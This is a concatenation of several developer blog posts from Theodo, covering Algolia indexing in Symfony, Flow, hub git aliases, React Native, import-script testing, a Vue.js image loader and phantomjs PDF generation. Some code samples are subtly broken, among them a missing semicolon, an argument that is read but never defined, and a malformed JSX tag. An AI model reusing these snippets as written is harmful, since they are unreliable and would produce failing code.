Sleep between 7 and 9 hours without interruption
Wake up during an REM phase, which is the phase in which you’re most likely to wake up naturally.

Want to win? Read the rest on Medium by clicking here !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										Creating a search engine from scratch may be tricky and lengthy. That is why, when I wanted to implement one in my Symfony app, I chose to use Algolia through its SaaS model.
Thanks to their Symfony bundle, I managed to map my Person and Company entities from my main database to their indexes with a couple of line commands. From then on, my users could carry out a research among the persons and companies registered in my online directory.

Here come the problems
Then I wanted to index news articles. Unfortunately my articles were stored in a second database, which was not handled by the Algolia bundle. I decided to create my own Symfony command by using Algolia’s API Client for PHP. In it, I queried all published articles in my table and indexed them one by one with the API client.

However, as I had tens of thousands of articles stored in my table, my server crashed when I tried to index them all in one go. So I added logs to keep track of the already indexed articles and an argument to the command to specify where to restart.

class IndexArticleCommand extends Command
{
    private $articleRepository;

    private $algoliaApplicationId;

    private $algoliaApiKey;

    public function __construct(ArticleRepository $articleRepository, $algoliaApplicationId, $algoliaApiKey)
    {
        $this->articleRepository = $articleRepository;
        $this->algoliaApplicationId = $algoliaApplicationId;
        $this->algoliaApiKey = $algoliaApiKey;
    }

    protected function configure()
    {
        $this
            ->setName('algolia:article:index')
            ->setDescription('Index all published articles in Algolia')
            ->addArgument('indexName', InputArgument::REQUIRED, 'What is the name of your index?')
            ->addArgument('startId', InputArgument::OPTIONAL, 'What content do you want to start indexing at? If not set, you start at 0.')
        ;
    }

    protected function execute(InputInterface $input, OutputInterface $output)
    {
        $indexName = $input->getArgument('indexName');
        $startId = $input->getArgument('startId') ? $input->getArgument('startId') : 0;

        $algoliaClient = new AlgoliaClient(
            $this->algoliaApplicationId,
            $this->algoliaApiKey
        );
        $algoliaIndex = $algoliaClient->initIndex($indexName);

        $publishedArticles = $this->articleRepository->getAllPublishedArticles($startId);

        foreach ($publishedArticles as $article) {
            $algoliaIndex->addObject(
                [
                    'title' => $article->getTitle(),
                    'body' => $article->getBody(),
                    'publishedAt' => $article->getPublishedAt(),
                    'image' => $article->getCoverImage(),
                    'objectID' => $article->getId()
                ]
            );
        }

        $output->writeln('Article #' . $article->getId() . ' indexed');
    }
}


What now?
So the articles were indexed and I was able to see them in my Algolia dashboard. Though I was not able to automatically update my Article index as my Article entity and my Article index were not mapped. In other words, when I updated a company for instance from my app administration page, my Company index on Algolia was automatically updated as well, but it was not the case to update my Article index.
To make things even worse, news articles were written and updated by journalists on their Ruby on Rails app that I had no control over at all. That is why I had to be creative. Luckily enough, a lot of information were stored in the Article table such as the last modification date. Thanks to that, I could write a new Symfony command that queried all articles that were modified in the last minute and updated the Article index accordingly.

class UpdateArticleIndexCommand extends Command
{
    private $articleRepository;

    private $algoliaApplicationId;

    private $algoliaApiKey;

    public function __construct(ArticleRepository $articleRepository, $algoliaApplicationId, $algoliaApiKey)
    {
        $this->articleRepository = $articleRepository;
        $this->algoliaApplicationId = $algoliaApplicationId;
        $this->algoliaApiKey = $algoliaApiKey;
    }

    protected function configure()
    {
        $this
            ->setName('algolia:article:update')
            ->setDescription('Update recently modified articles in Algolia')
        ;
    }

    private function formatArticleInArray(Article $article) {
        return [
            'title' => $article->getTitle(),
            'body' => $article->getBody(),
            'publishedAt' => $article->getPublishedAt(),
            'image' => $article->getCoverImage(),
            'objectID' => $article->getId()
        ]
    }

    protected function execute(InputInterface $input, OutputInterface $output)
    {
        $indexName = $input->getArgument('indexName');

        $algoliaClient = new AlgoliaClient(
            $this->algoliaApplicationId,
            $this->algoliaApiKey
        );
        $algoliaIndex = $algoliaClient->initIndex($indexName);

        $oneMinuteAgo = new \DateTime()->modify('-1 minute');

        $lastModifiedArticles = $this->articleRepository->getModifiedArticlesSince($oneMinuteAgo);

        foreach ($lastModifiedArticles as $article) {
            //If the article is published
            if ($article->isPublished() == True) {
                //If it exists in the index, we update it
                if ($algoliaIndex->search($article->getTitle())) {
                    $algoliaIndex->saveObject($this->formatArticleInArray($article));
                    $output->writeln('Article #' . $article->getId() . ' updated');
                //It it doesn't, we create it
                } else {
                    $algoliaIndex->addObject($this->formatArticleInArray($article));
                    $output->writeln('Article #' . $article->getId() . ' indexed');
                }
            //If the content is now unpublished, we delete it
            } else {
                $algoliaIndex->deleteObject($article->getId());
                $output->writeln('Article #' . $article->getId() . ' deleted');
            }
        }
    }
}


Conclusion
Algolia is a very powerful tool to quickly implement a search engine even though it may have some limits. However, those limits can be overcome thanks to their API client, as tedious as my solution may seem.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cédric Kui
  			
  				I enjoy browsing cat and panda GIFs while drinking tea. Oh, I am also a Web Developer at Theodo  			
  		
    
			

									"
"
										
Static Type Checking is Life, Static Type Checking is Love
Javascript has been a hot topic for web developers for some time now.
It’s fast, runs everywhere and offers many wonderful frameworks such as Angular and React.
However, its lack of static typing can be a real pain for developers, bugs only appear at runtime, are hard to find and code refactoring is a real challenge.
This is where static type checkers such as TypeScript and Flow come into play with their main features being:

Helping to catch errors early, close to the root cause and at buildtime
Improving code readability and maintainability

When Should You Use a Type Checker?

For long and complex projects
If there is a chance you will have to refactor it at some point
If team members change regularly

If you are sick and tired of random errors induced by typing errors, you should definitely join the static type checking club!
What Does Flow Bring to the Game?
What Flow Is
Flow is a JavaScript static type checker. The open source project has 9,000+ stars on GitHub at the time this article is being written.
The project is active – more than 30 commits are merged in average every week with bug fixing and new features.

It was introduced by Facebook in 2014 with two main features:

Finding type errors in your code
Offering a static typing syntax

How does it work?
Flow is a checker while TypeScript is a compiler.
Flow works in two different ways:

You specify to the tool the types you expect, and it checks your code based on this as shown below



The tool can deduce expected types by itself and check the code with those assumptions

The second point, called type inference, is one of the main features of Flow. It makes it possible for Flow to check your code even if you don’t adapt it, you can see an example in the code below.


To run Flow code Facebook recommends to use Babel to strip static types before serving the client, you can find more information about this here
Why Should You Use Flow?

It works well with JSX syntax and React
Refactoring so easy (it can match module and function names between files and pops up an error if you missed an old occurrence)
It’s opt-in so you can check your code incrementally
It implements weak checking for legacy code
It allows you to use “maybe types” (undefined, null, and mixed) so that you are free to keep some stuff dynamic

Getting Started with Flow
How Can you Start Using it?
To get started with Flow on an existing project you’ll need to go through some basic steps:
In your project’s directory

Create a Flow config file touch .flowconfig
Install the Flow module npm install --save-dev flow-bin
Add this line in the package.json:


""scripts: {
   ""flow"": ""node node_modules/.bin/flow""
}


Now use npm run flow at the root of your project

It’s that easy!
And now you can start implementing it in your code by adding an annotation at the top of the files you want to check:

    // @flow

    var str = 'hello world!';
    console.log(str);

If you get npm error info after the command it’s the way npm reacts to Flow exiting with errors, that won’t affect Flow’s accuracy.
If you Use it, Use it Right!
There are two ways to use Flow, the right way and the wrong way.
You can always use it with no further installs by running
npm run flow in your CLI which will show you all the typing errors it can find.
But the most efficient and fastest way of using it is through an IDE plugin of which here are some examples:

Flow for Atom
Flow for VSCode
Flow for Vim

These plugins usually start the flow server and allow you to see errors as you write your code, much like a linter would.

It saves you the pain of writing then checking so that you can write “flowless” code right from the start ;).
Conclusion
Make Your Code Safer and More Reliable
Flow will increase the safety and maintainability of your app.
It can prevent a lot of type induced regressions on your projects and make bugs easier to find as they appear at buildtime or even as you write thanks to Flow IDE linters.
It will make your code more understandable and safer to refactor.
Spare Yourself Type Checking Tests
You will never have to write tests like this ever again!

  it 'should create a favorites array in local storage', ->
    $localStorage.favorites.should.be.an.array
    $localStorage.favorites.should.be.empty

Why Flow Instead of TypeScript ?
Flow is growing really fast with a lot of support and most of all, it works really great with Facebook’s React framework which makes it even more exciting.
Flow handles non-nullable types as default while TypeScript does not and Flow is generally more expressive. That means that Flow will catch more errors related to variables ending up null.
Finally, Flow requires a smaller effort to be implemented on existing projects as you can start checking your files gradually.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jérémy Dardour
  			
  				  			
  		
    
			

									"
"
										At Theodo a lot of our projects follow the Agile git workflow described in another article by my coworker Aurore.
With this worklow, we have to create 2 pull requests every time we finish a feature:

one for the staging branch that will be merged after the code review
one for the develop branch that will be merged once the feature has been validated and is ready to be shipped into production

I was spending so much time doing these actions I thought “Hey maybe I can write a git alias to do this for me!”
Introducing hub: the github CLI
Hub is a command-line wrapper built with the go language that enables you to do cool stuff with Github.
For example you can create pull requests, fork repositories or even create a new Github repository straight from your terminal!
Install hub
On Linux
To install hub you first need to install go first.
As for now the latest version of go is 1.7.3, to install it run the following commands:
curl https://storage.googleapis.com/golang/go1.7.3.linux-amd64.tar.gz > go1.7.3.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.7.3.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

If you want to install go on your system add the last line to your /etc/profile.
Once go is installed, run the following commands to install hub:
git clone https://github.com/github/hub.git && cd hub
script/build -o ~/bin/hub

If ~/bin/ is not already in your path, add the following line to your ~/.profile file:
export PATH=$PATH:$HOME/bin

On Mac
To install hub you first need to install go first:
brew install go

If you want to install go on your system add export PATH=$PATH:/usr/local/go/bin to your /etc/profile.
Once go is installed, run the following commands to install hub:
brew install hub

Create a git alias to create pull requests
Git aliases are a great way to group your git-related shortcuts.
I personnaly enjoy creating new ones, especially since I know that they can link to any Bash function.
To create an alias that will create your pull requests for staging and develop add this line to your ~/.gitconfig file in the alias section:
    pr = ""!f(){ \
        hub pull-request -m \""$1\"" -b staging -h `git rev-parse --abbrev-ref HEAD` -l \""Please Review\""; \
        hub pull-request -m \""$1\"" -b develop -h `git rev-parse --abbrev-ref HEAD` -l \""Waiting for validation\""; \
    }; f""

What does it do?
First we declare a bash function (it is not really needed here, except for code clarity).
Then we execute two hub commands, which take the following arguments:

-m \""$1\"" sets the first argument passed to the git command as the pull request message
-b staging and -b develop sets staging or develop as the base branch
-h `git rev-parse --abbrev-ref HEAD` sets the current branch as the head branch
-l \""Please Review\"" adds the Please Review label to the pull request

Create pull requests faster than Bruce Almighty
 
If I am on a branch called feature/a-completely-awesome-feature and I run this:
git pr ""Remove js console error""

It will create both pull requests (on staging and on develop) from my feature branch on my Github remote and that took me less than 5 seconds!

Add templates to your pull requests
My fellow Theodoer William wrote a git extension to handle pull request templates: if such a template is found, your editor will be prompted and prefilled with your template.
You’ll also be able to check the commits in each pull request before opening them!
Here’s the link to the install guide: https://github.com/williamdclt/git-pretty-pull-request/pulls
 
If you wish to improve this article or if you want to share other cool git aliases, please feel free to comment below!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
		    
  		
  			
  				  			
  		

  		
				William Duclot
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Mobile Apps are a crucial part of our daily life.
Yet, building a native mobile app for everyone requires to have knowledge in at least two languages: Java for Android and Swift or Objective-C for iOS.
At least, that’s what I thought until I discovered React Native.
What is React Native?
React Native is a framework to build native apps using only Javascript.
For the Javascript fan I am, it’s a great opportunity.
React Native builds native apps, and not hybrid apps or «HTML5» apps.
This is possible because the Javascript written is transformed into native UI blocks for Android or iOS.
I suggest you check React Native’s official website for more information.
Let’s jump into building our first mobile app.
Installing React Native
The first step is installing React Native 
I won’t pretend explaining this better than what has already been done in the last few months.
However, I have a few suggestions and links to share.
To install the CLI tools for React Native, you’ll need Node.js (Node.js 6 works fine, I haven’t tested other versions but React Native should work with Node.js 4 or newer).
Then you can just run npm install -g react-native-cli to install React Native.
iOS
In order to develop an iOS app, you’ll need a Mac with xCode (you can find it on the AppStore).
If you are using Linux, a great article has been published to help you develop iOS app on Linux.
XCode comes up with a simulator, which we will use for development.
Android
Testing you application on an Android device is a bit tougher.
The best practices are described on React Native’s website.
Here are the main points:

Install Android Studio
Set up paths
export ANDROID_HOME=~/Android/Sdk
export PATH=${PATH}:${ANDROID_HOME}/tools


Set up Android Virtual Device (if not set up by Android Studio)
android avd



Creating and running a React Native App
Everything in this article is summed up in this Github repository.
To create a React Native App run:
react-native init <YourAppNameHere>

Then launch it on the simulator you want with :
react-native run-ios
react-native run-android

You should see the following screen on your emulator:

Modifying our app
Let’s enter the fun part!
Creating our first cross platform mobile app!
Open you favorite editor and let’s take a look at what React Native generated for us.
The whole code for this article is available here.
We have two files that represent our two entry points: one for iOS (index.ios.js) and one for Android (index.android.js).
Let’s play with the index.ios.js and change the text and style.
<Text style={styles.welcome}>
  Our first React Native App
</Text>

You can see the changes in your emulator by pressing Ctrl+R or Cmd+R thanks to some live reloading.
This makes React Native development so much easier.
How does the styling work in React Native?
The sample app gives us an example of how the styling works in React Native.
const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#F5FCFF',
  },
});

There are two key points to have in mind when developing in React Native.

React Native uses flexbox for the design.
If you’ve never used flexbox, here are two awesome links to master it in minutes 


A TD game
A greatly written guide


React Native writes CSS styles in camel case.


background-color => backgroundColor
border-width => borderWidth

React Native Components
You can find a list of components to use in React Native on their official website.
For our demo app, we’ll use the navigation component given to us by RN : Navigator
Let’s create a src folder where the components inside will be used by both our Android and iOS app.
Inside our src folder, let’s create a components folder and inside it two JS files : firstPage.js and secondPage.js
firstPage.js
import React, {Component} from 'react';
import {
  StyleSheet,
  Text,
  TouchableHighlight,
  View
} from 'react-native';

import SecondPage from './secondPage';

class FirstPage extends Component {
  static route(props) {
    return {
      id: 'FirstPage',
      component: FirstPage
    };
  }

  render() {
    return (
      <View style={styles.container}>
        <Text>This is the first view</Text>
        <TouchableHighlight onPress={() => this.props.navigator.push(SecondPage.route())}</TouchableHighlight>
      </View>
    );
  }
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#FF00FF',
  },
});

export default FirstPage;


secondPage.js
import React, {Component} from 'react';
import {
  StyleSheet,
  Text,
  View
} from 'react-native';

class SecondPage extends Component {
  static route(props) {
    return {
      id: 'FirstPage',
      component: SecondPage
    };
  }

  render() {
    return (
      <View style={styles.container}>
        <Text>This is the second view</Text>
      </View>
    );
  }
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#FFFF00',
  },
});

export default SecondPage;

In the FirstPage component, our button is a TouchableHighlight and it has a onPress method that pushes the second view.
Our second page component just has a text.
We then need to set up our Navigator to go back and forth from one page to the other.
First, in our index.ios.js, let’s remove what’s in the container View and add a Navigator:
index.ios.js
render() {
  return (
    <View style={styles.container}>
      <Navigator
        initialRoute={FirstPage.route()}
        renderScene={this.renderScene}
        style={styles.navigator} />
    </View>
  );
}

Let’s analyze these lines.

We’ve given our Navigator an initial route that will be displayed when loading our app.
We’ve given a renderScene function that will render our different scenes.
We’ll take a look at this function in a moment.
We’ve given a style to our Navigator

What should our renderScene do?
Well, it should render our component.
Let’s see how to write this:
index.ios.js
renderScene = (route, navigator) => {
  return React.createElement(route.component, {navigator: navigator});
}

Our renderScene method takes two arguments.
The first one is the component we want to mount and the second one is the navigator itself.
We’ll need to pass the navigator to our components as a prop to be able to navigate back and forth.
FirstComponent
static route(props) {
  return {
    id: 'FirstPage',
    component: FirstPage
  };
}

Let’s run our app… Here is how it should look.



First Screen
Second Screen









Now, there’s something missing here.
Indeed, when navigating in an app, we’re expecting a Navbar on the top to navigate!
Putting a Navbar
Navigator has a way of doing this.
You can pass a component written by your hands to it and it will display it as a Navbar.
However, react native being an open source project, the community has developed a lot of packages for us to use.
In this repository, you’ll find a non-exhaustive list of great packages.
Here, we’ll be using the package React Native Navbar.
Let’s install it.
npm i --save react-native-navbar

Then, let’s import it in our two views.
import NavBar from 'react-native-navbar';

FirstComponent
render() {
  const titleConfig = {
    title: 'First Component',
  };

  return (
    <View style={styles.container}>
      <NavBar title={titleConfig} />
      <View style={styles.content}>
        <Text>This is the first view</Text>
        <TouchableHighlight onPress={() => this.props.navigator.push(SecondPage.route())} style={styles.button}>
          <Text>Go to second view</Text>
        </TouchableHighlight>
      </View>
    </View>
  );
}

SecondComponent
render() {
  const titleConfig = {
    title: 'Second Component',
  };

  const leftButtonConfig = {
    title: 'Previous',
    handler: () => this.props.navigator.pop(),
  }

  return (
    <View style={styles.container}>
      <NavBar title={titleConfig} leftButton={leftButtonConfig} />
      <View style={styles.content}>
        <Text>This is the second view</Text>
      </View>
    </View>
  );
}

In order for our components to render as we expect them to, we need to change a bit our components’ styles.
container: {
  flex: 1
},
content: {
  flex: 1,
  backgroundColor: '#FFFF00',
  justifyContent: 'center',
  alignItems: 'center'
}

Here is what we have now!

Conclusion
We now have a fully functional React Native app.
Of course, it doesn’t do much yet but I’m sure you’ll be able to build on this.
To go further in building apps, the next good thing to take a look at is redux.
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Grégoire Hamaide
  			
  				Agile Developer @ Theodo  			
  		
    
			

									"
"
										A major issue during my last project was regressions in production occurring twice a week. The PO felt anxious, and the project was in danger,
even though the team was reactive and able to quickly fix regressions.
Why so many regressions?
A good explanation could be the lack of tests. However, both Node.js/Express.js back-end and AngularJS front-end were 80% covered by unit/end-to-end tests. Tests are supposed to prevent regressions so what’s wrong with them?
Something was clear: most regressions were related to the data.
Data regression: a case study
In our app, people can have phone numbers on their profile page. The app receives on a daily basis a file containing people IDs and phone numbers. The team wrote a script loading phone numbers into the database every night.
A regression occurred on the second day: people have the same phone number twice on their profile pages  This is typically a data issue:

the front-end showed twice the same phone number on profile pages because that’s what it received from the back-end;
the back-end served twice the same phone number because people have twice phone numbers in the database.

The culprit was the import script that did not remove old phone numbers before loading the new ones. Neither back-end tests nor front-end tests could have spotted this issue. If we look at the data flow of the application: import scripts lack tests!

What do we need to test?
Data come from CSV files we received daily through a FTP. A Python script fetches the files and loads data in the database every night.
File encoding
Files are encoded in various formats: UTF-8, ISO-8859-1, Windows-1252 and even EBCDIC!. Checking that scripts can properly read, decode and reincode these files is a first step.
Data formatting
Data is usually processed before insertion into database. Due to having heterogeneous sources, phone numbers have various format e.g., “0123456789”, “123456789”, “0033123456789”, “+33123456789” or “6789 – 0123456789”. To prevent bad format errors from occurring later in the process, the import scripts format all phone number in a standard format, say “+33123456789”.
A good test should verify that loading “0033123456789” from a CSV file ends up with “+33123456789” in db.
Data consistency
The import scripts not only load data but also establish relations upon it. For instance, imagine the script loads two csv files respectively containing people names and phone numbers:



ID
lastname
firstname

ID
phone number




424242
Obama
Michelle

424242
+33123456789



Our test should check that Michelle Obama gets the phone number “+33123456789” in the database.
Data resilience
The import script is launched every day, hence all data is refreshed every day. Let say that the app received the following two files respectively on day 0 and day 1:



ID
phone number

ID
phone number




424242
+33123456789

424242
+33123456789


424242
+33123456790

424242
+33123456791



On day 0, Michelle Obama should have two phone numbers “+33123456789” and “+33123456790”. On day 1, we expect the import script to remove “+33123456790” and to add “+33123456791” so that Michelle ends up with two phone numbers again.
How do we write the test?
The directory structure of the test folder looks like this:
test
├── import-script-test.py
├── payloads
|   ├── day0 // Folder containing csv files that are loaded on day 0
|   |   └── names.csv
|   |   └── phone_numbers.csv
|   ├── day1 // Folder containing csv files that are loaded on day 1
|   |   └── names.csv
|   |   └── phone_numbers.csv
|   ├── day2 // Folder containing csv files that are loaded on day 2
|   |   └── ...
| ...
├── data
|   ├── day0 // Folder containing a dump of the expected data for day 0
|   |   └── people.json
|   ├── day1 // Folder containing a dump of the expected data for day 1
|   |   └── people.json
|   ├── day2 // Folder containing a dump of the expected data for day 2
|   |   └── ...
... ...

The test import-script-test.py is written in Python and consists in:

emptying the test database;
loading test/payload/day0/*.csv files with the import scripts;
getting a JSON extraction of the database;
comparing “field by field” the extraction with test/data/day0/people.json;
starting over again steps 1, 2 and 3 for day1, day2, … and so on.


It is an end-to-end test for the import script that allows us to verify all the aforementioned points. Payload files are kept small so that the test can be easily updated. Running consecutive imports allows to check data resilience.
Epilogue
Testing the import scripts prevents many regressions due to data.
Not all projects need import scripts tests. You should evaluate the data flow of your app to decide whether it is worth it.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Toubhans
  			
  				Web-developer at Theodo.  			
  		
    
			

									"
"
										 
When I’m stuck on a train or queuing at the supermarket I usually read one or two articles on Medium.
There’s plenty of stuff that I really love about Medium. Like the email they send me every morning. Or the personal recommendations on their main page.
And the blurry image loading. I mean, seriously, the first time I noticed it I was like:

If you don’t know what I’m talking about, click on this link and see how the top image is displayed.
I recently started using Vue.js and I thought, well, let’s see if we can build a Vue.js component to do this!
How it works
So I wondered, how do this thing work? Fortunately José M. Perez has done a wonderful (Medium) blog post explaining the principle of this technique. He even provided us with a plain javascript implementation.
If you don’t want to read the whole article, the core principle is really simple:

Download a low-resolution image and scale it to the real size (your browser will take care of the blur)
Once your real image is downloaded, put it instead of the low-res one

Let’s start
For our example, imagine our HTML looks just like this:
<!DOCTYPE html>
<html>
<head>
  <style>
    img {
      width: 100%;
    }
  </style>
</head>
<body>
  <img
    src=""https://cdn-images-1.medium.com/max/1800/1*sg-uLNm73whmdOgKlrQdZA.jpeg""
  ></img>
</body>
</html>


It’s very simple: it displays one image.
First let’s include Vue.js, our .js script and substitute the img tag by a custom one that will call our component, such as blurry-image-loader:
<!DOCTYPE html>
<html>
<head>
  <script src=""https://cdnjs.cloudflare.com/ajax/libs/vue/1.0.26/vue.min.js""></script>
  <style>
    img {
      width: 100%;
    }
  </style>
</head>
<body>
  <blurry-image-loader
    src=""https://cdn-images-1.medium.com/max/1800/1*sg-uLNm73whmdOgKlrQdZA.jpeg""
    small-src=""https://cdn-images-1.medium.com/freeze/max/27/1*sg-uLNm73whmdOgKlrQdZA.jpeg?q=20""
  ></blurry-image-loader>
  <script src=""vue-blurry-image-loader.js""></script>
</body>
</html>

Yay! Now that our HTML is ready, let’s create our script! First of all, we have to create a new Vue instance and to register our component:
Vue.component('blurry-image-loader', {})

new Vue({
  el: 'body'
})

Allright. As you probably saw earlier, our HTML component has two attributes: the url of the image in full size (src) and the smaller image (small-src). We can register those attributes as props in our Vue.js component:
Vue.component('blurry-image-loader', {
  props: [
    'src',
    'smallSrc'
  ]
})

N.B.: we have to use camelCase in javascript, so small-src becomes smallSrc.
Ok let’s go on step-by-step: let’s say the template of our component will be an image with the low-res image:
Vue.component('blurry-image-loader', {
  props: [
    'src',
    'smallSrc'
  ],
  template: '<img :src=smallSrc></img>'
})

So now if you open your HTML file in your browser, you should see a blurry image. But that’s not going to work with that template, we need the src attribute of the img element to change when our real image is loaded. So we need a kind of changing props, which is in fact a … data!
Let’s call it imageSrc and initialize it to the value of smallSrc:
Vue.component('blurry-image-loader', {
  props: [
    'src',
    'smallSrc'
  ],
  data: function () {
    return {
      imageSrc: this.smallSrc
    }
  },
  template: '<img :src=imageSrc></img>'
})

Good! We’re nearly there.
Now we need to load the real image when the component is created, and once this is done we have to change the value of imageSrc. Vue.js components have a ready attribute which gives us the possibility to execute a function once the component is ready. I believe this sounds like the right place to do our loading!
(N.B.: in Vue 2 the ready atribute is now called mounted)
(N.B.: as pointed out by Bokkeman in the comments, to prevent trouble with your browser cache set your image src attribute after the onload event handler)
Vue.component('blurry-image-loader', {
  props: [
    'src',
    'smallSrc'
  ],
  data: function () {
    return {
      imageSrc: this.smallSrc
    }
  },
  template: '<img :src=imageSrc></img>',
  // use mounted in Vue.js 2.0
  ready: function () {
    var img, that
    img = new Image()
    that = this
    img.onload = function(){
      that.imageSrc = that.src
    }

    img.src = this.src
  }
})

And voilà! We have achieved this with actually fewer lines of code than I thought!
You can check out my Codepen to see it live (I’ve added a small timeout to make sure you see the blurry image).
I you liked this article please share it and keep checking out this blog, I’m currently writing part 2 which will show how to smooth the unblurring!
 
To discover how to achieve the exact same effect with transitions head to part 2 over here.
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
			

									"
"
										
Did you ever have to generate PDF files in a web application?If you did, chances are that you liked it as much as that 5-hours train journey seating next to a crying baby after a sleepless night…I was on a project where we had to generate a 8-pages pdf with footers, headers and include some data from our app.We asked other people to know which tool can do the job.Everyone tells us that it’s:

A nightmare to generate a great pdf with html
Headers and footers are always a hard task
A nightmare
Very long
Did I already said a nightmare?

After all these interviews, the task seemed hard.But we wanted to make some search to be sure there is no tool out there that can make the job easily.And we found one.It is a tool that:

Is easy to install
Is easy to use
Makes great pdf in no time

This tool is phantomjs, which is a headless browser usually used to test our pages.Let’s dig into this and see how we can now master the server side pdf generation across all our apps!
Generate the first PDFs
In order to generate your first page, you need to download phantomjs (you can use npm).The next step is to write the script: 
// mypage.js

var page = new WebPage();
var html = ""<div>My first page!!</div>"";

page.setContent(html, null);
page.onLoadFinished = function (status) {
  page.render(""mypdf.pdf"");
  phantom.exit();
};

You can now generate your pdf file using:
./path/to/phantomjs mypage.js

Pretty easy right? But wait, the page is in landscape mode, I want it in portrait!No problem, phantomjs can easily handle that.In fact, the page object has a paperSize property you can edit to make the page look like whatever you want.For example: 
// mypage.js

var page = new WebPage();
var html = ""<div>My first page!!</div>"";

page.setContent(html, null);
page.paperSize = {
  format: ""A4"",
  orientation: ""portrait"",
  margin: { 
    left:""1cm"", 
    right:""1cm"", 
    top:""1cm"", 
    bottom:""1cm"" 
  }
};

page.onLoadFinished = function (status) {
  page.render(""mypdf.pdf"");
  phantom.exit();
};

You can now generate again and you have a pdf in portrait mode, with margins around to contain the body of your page.But it is not good to have your js and your html in the same file…So let’s move the html in a file named myhtml.html, in the same folder.You can reference to this file using page.open: 
<!-- myhtml.html -->
<!DOCTYPE html>
<html>
  <head>
    <meta charset=""utf-8"" />
  </head>
  <body>
    <div>My first page!!</div>
  </body>
</html>

// mypage.js

var fs = require(""fs"");
var page = new WebPage();
page.paperSize = {
  format: ""A4"",
  orientation: ""portrait"",
  margin: { 
    left:""1cm"", 
    right:""1cm"", 
    top:""1cm"", 
    bottom:""1cm"" 
  }
};   

page.open(
  ""file://"" + fs.absolute(""./myhtml.html""), //myhtml.html is in the same folder
  function (status) {
    page.render(""mypdf.pdf"");
    phantom.exit();
  }
);

Ok that’s great!But I need multiple pages with headers and footers!To add pages in your PDF, you use the css rules page-break-after and page-break-before.For example, the following css will render two pages: 
<style>
#page {
  page-break-after: always;    
}
</style>
<div id=""page"">My first page</div> 
<div>My second page</div>

Now you can add multiple pages, just need headers and footers and you are good to go!In fact, adding headers and footers is quite simple, you have to edit again the paperSize property: 
page.paperSize = {
  format: ""A4"",
  orientation: ""portrait"",
  margin: { 
    left:""1cm"", 
    right:""1cm"", 
    top:""1cm"", 
    bottom:""1cm"" 
  },
  header: {
    height: ""3cm"",
    contents: phantom.callback(
      function(pageNum, numPages) {
        return(""Header: ""+pageNum+""/""+numPages);
      }
    )
  }
}

Now you have a header with a pagination, great! Footers work the same way. 
We are able to generate great pdf now.But we have to use phantomjs on the server, and it’s a binary, so we will need to launch the command path/to/phantomjs myscript.js from our server.And we need to handle errors, and be able to debug, etc…It is a bit painful to handle that, and there are great tools out there that are able to get it done for us!On my project, we used nodejs and we found the node-html-pdf package, which is really great for our tasks!
Node-html-pdf
Node-html-pdf is a tool that uses phantomjs to print pdf.It adds some cool features and provide an easy API you can use on your Node.js server.The last thing you will have to do after reading this part is adding a route on your server which calls the pdf generation with phantomjs.Let’s dig into this!
Node-html-pdf provides a set of methods to easily generate pdf on your server.For example, the last example of the previous chapter can be done by writing: 
// myserver.js

var pdf = require(""html-pdf"");
var fs = require(""fs"");
var html = fs.readFileSync(""./myhtml.html"");
var options = {
  format: ""A4"",
  orientation: ""portrait"",
  border: { // note that margin becomes border
    left:""1cm"", 
    right:""1cm"", 
    top:""1cm"", 
    bottom:""1cm"" 
  }
};

pdf
  .create(html, options)
  .toFile(
    __dirname + ""/mypdf.pdf"",
    function (err) {
      if (err) console.log(err);
    }
  );

And you generate your pdf with the command: 
node myserver.js

But that’s not finished yet! Node-html-pdf adds some cool features like setting the header and the footer in your html instead of your js options.You can do that with specific id in your html: 
<!-- Default header -->
<div id=""pageHeader"">Header: {{page}}/{{pages}}</div>

<!-- Default footer -->
<div id=""pageFooter"">Footer: {{page}}/{{pages}}</div>

<!-- nth header -->
<div id=""pageHeader-n"">My nth header</div>

The last example shows that you can even set a default header of your pages and use another one for specific pages!
There is one thing i did not mention yet, and it is how to use pictures and scripts.With node-html-pdf, it’s pretty easy: you have to define the path of your asset folder in options and reference the file you want in your html:
// myserver.js
var options = {
  …,
  base: ""file://"" + __dirname + ""/asset/""
};

<!-- myhtml.html -->
<img src=""myimage.png"" /> 
<!-- myimage.png is in my asset folder, at the root of my directory -->

Conclusion
We now know how to generate great pdf on your server.It is no longer painful to generate a pdf using html. And you can use your favorite templating engine (like mustache, handlebars, …) to insert your data and make the perfect pdf!
Known issue: 
There is an issue we faced using node-html-pdf: 

Images in header are not rendered.To handle that, you can convert your images in base64 and replace the output in your html string.If you’re not using a templating engine, you can do:
var html = fs.readFileSync(""path/to/html"")var image = fs.readFileSync(""path/to/dog.png"");var encodedImage = new Buffer(image).toString(""base64"");html = html.replace(""{{encodedImage}}"", encodedImage)pdf.create(...).toFile(...);


And in your html file:
